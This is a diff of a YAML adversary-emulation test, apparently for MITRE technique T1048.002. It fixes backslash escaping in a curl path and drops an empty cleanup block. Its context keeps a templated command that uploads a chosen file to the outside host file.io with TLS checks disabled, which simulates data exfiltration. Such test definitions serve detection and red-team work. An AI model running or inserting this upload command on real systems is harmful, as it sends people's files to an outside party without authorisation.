@@ -8,7 +8,7 @@ args:
       default: PathToAtomicsFolder/T1048.002/src/artifact
     - name: curl_path
       type: path
-      default: C:\Windows\System32\Curl.exe
+      default: C:\\Windows\\System32\\Curl.exe
 uuid: 1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0
 mitre:
     tactics:
@@ -41,6 +41,3 @@ steps:
       inline: |
         {{.Args.curl_path}} -k -F "file=@{{.Args.input_file}}" https://file.io/
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
